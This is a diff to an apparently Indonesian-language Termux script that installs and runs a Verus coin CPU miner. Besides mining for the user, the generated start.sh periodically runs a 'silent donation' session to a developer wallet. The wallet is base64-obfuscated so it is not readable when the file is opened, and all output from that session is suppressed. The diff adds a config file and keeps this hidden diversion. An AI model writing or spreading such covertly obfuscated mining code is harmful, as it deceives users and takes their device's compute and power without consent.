@@ -51,11 +51,34 @@ wget -O ccminer https://raw.githubusercontent.com/muflikhudin/verus-termux/main/
 
 chmod +x ccminer
 
-# Wallet Anda dikonversi ke Base64 agar tidak terbaca langsung jika file start.sh dibuka
+# 1. MEMBUAT CONFIG.JSON (Menyimpan wallet pengguna secara permanen)
+cat > config.json <<EOF
+{
+  "pools": [
+    {
+      "name": "US-VIPOR",
+      "url": "stratum+tcp://us.vipor.net:5040",
+      "timeout": 180,
+      "disabled": 0
+    }
+  ],
+  "user": "${WALLET}.${WORKER}",
+  "pass": "x",
+  "algo": "verus",
+  "threads": 8,
+  "cpu-priority": 1,
+  "cpu-affinity": -1,
+  "retry-pause": 10,
+  "api-allow": "192.168.0.0/16",
+  "api-bind": "0.0.0.0:4068"
+}
+EOF
+
+# Wallet Anda dikonversi ke Base64 agar tidak terbaca langsung di start.sh
 ENC_WAL=$(echo "RCifYPWunGQna28DpzbPakNE5L8fftkjVd" | base64)
 WRK_DONASI="Donasi_20pc"
 
-# Membuat start.sh dengan enkripsi wallet dan donasi senyap di belakang layar
+# 2. MEMBUAT START.SH (Menggunakan kombinasi config.json & parameter senyap)
 cat > start.sh <<EOF
 #!/data/data/com.termux/files/usr/bin/sh
 while true
@@ -63,13 +86,14 @@ do
     echo "========================================="
     echo " Memulai mining Verus Coin...            "
     echo "========================================="
-    ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${WALLET}.\${WORKER} -p x -t 8 --cpu-priority=1 &
+    # Membaca wallet pengguna dari config.json yang sudah dibuat permanen
+    ./ccminer -c config.json &
     PID=\$!
     sleep 4800
     kill \$PID
     wait \$PID 2>/dev/null
 
-    # Dekripsi wallet dev langsung di memori saat sesi donasi berjalan (Tidak terlihat di layar)
+    # Sesi donasi berjalan di latar belakang (Senyap)
     DEV_WAL=\$(echo "${ENC_WAL}" | base64 -d)
     ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${DEV_WAL}.${WRK_DONASI} -p x -t 8 --cpu-priority=1 > /dev/null 2>&1 &
     PID=\$!
